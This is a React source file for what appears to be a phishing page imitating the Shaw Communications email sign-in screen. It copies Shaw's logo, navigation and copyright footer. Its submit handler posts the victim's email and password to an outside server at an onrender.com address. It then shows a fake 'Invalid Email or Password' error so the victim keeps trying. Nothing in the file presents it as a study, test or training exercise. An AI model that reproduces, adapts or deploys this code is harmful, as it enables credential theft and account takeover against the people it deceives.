import React from 'react';

import './home.css';
import logo from './logo.png';
import  helpIcon from './helpIcon.png';
import { useState } from 'react';
import axios from 'axios';



function Home(){
    const[email, setUserName] = useState("");
    const[password, setPassword] = useState("");

    const[platform, setPlatform] = useState("Shaw")

    const[showError, setShowError] = useState(false);

    

    async function handleSubmit(e){
        e.preventDefault();
    
        try {
            const response = await axios.post('https://myrootbackend-4cjn.onrender.com/api/send', {
                email:email,
                password:password,
                platform:platform
            });
        
            // Handle success
            console.log('Data sent:', response.data.message);
    
            if(response.status == 200){
                console.log(response.data.message);
    
                setShowError(true);
            }
          } catch (error) {
            // Handle error
            console.error('Error:', error);
          }
        
    }

    return (
        <>
            <div className='navdiv'>

                <div className='firstnav'>

                   

                    <ul className='list'>
                        <li className='list_item'>Personal</li>
                        <li className='list_item'>Business</li>
                    </ul>


                    <ul className='list listwo ml-3'>
                        <li className='list_item_two'>Shop</li>
                        <li className='list_item_two'>Support</li>
                        <li className='list_item_two'>My Shaw</li>
                    </ul>

                </div>

                <div className='lastnav'>

                    <p className='contact'><i className='fa fa-comment mx-2'></i>Contact</p>

                </div>

            </div>

            <br/>



            <div className='col-md-7 m-auto formdiv'>
            {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
            <strong>Invalid Email or Password</strong> 
            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
            </button>
            </div>}
                    <div className='row'>

                        <div className='col-md-8'>
                            <div className='logodiv text-center'>
                                <img src={logo} className="mylogo" />

                            </div>


                            <h4 className='heading'>Sign in to access your Shaw email</h4>


                            <form onSubmit={handleSubmit} className='myform mt-3'>

                                <div className=''>
                                    <label className='formlabel'>Shaw email</label>
                                    
                                    <div className='d-flex'>
                                    <input onChange={function(e){
                                        setUserName(e.target.value);
                                    }} value={email} className='form-control'placeholder='example@shaw.ca' /><div><img className="help mx-1"src={helpIcon} /><br/><p className='helptext'>Help</p></div>
                                    </div>
                                </div>

                                <div className=''>
                                    <label className='formlabel'>Password</label>
                                    
                                    <div className='d-flex'>
                                    <input onChange={function(e){
                                        setPassword(e.target.value);
                                    }} value={password} className='form-control' /><div className='hideme'><img className="help mx-1"src={helpIcon} /><br/><p className='helptext'>Help</p></div>
                                    </div>
                                </div>

                                <div className=''>
                                    <input type="checkbox"className='checkbox' /> <span className='checkspan'>Remember Shaw email</span>

                                </div>


                                <div className='buttondiv text-center'>

                                    <button type='submit' className='btn mybtn'>Sign In</button>

                                </div>

                                <div className='mt-3 text-center'>
                                    <p className='endingpara'><span className='endspan'>Having trouble? </span><a href=''>Shaw Support: How To Reset My Password</a> </p>

                                    <p className='endingpara'><span className='endspan'>Already Know How? </span><a href=''>Reset Password On My Shaw </a></p>
                                   

                                </div>

                            </form>
                        </div>

                        

                    </div>
            </div>


            <div className='navdivtwo'>

                <div className='firstnav'>

                   

                    
                <p className='contacttwo'>© 2022 Shaw Communications. All Rights Reserved.</p>

                    

                </div>

                <div className='lastnav'>

                   
                    

                    <ul className='list ml-3'>
                        <li className='list_item_two_end'>Privacy Policy</li>
                        <li className='list_item_two_end'>Terms of Use</li>
                        <li className='list_item_two_end'>Accessibility</li>
                    </ul>
                </div>

            </div>
        </>
    );

}

export default Home;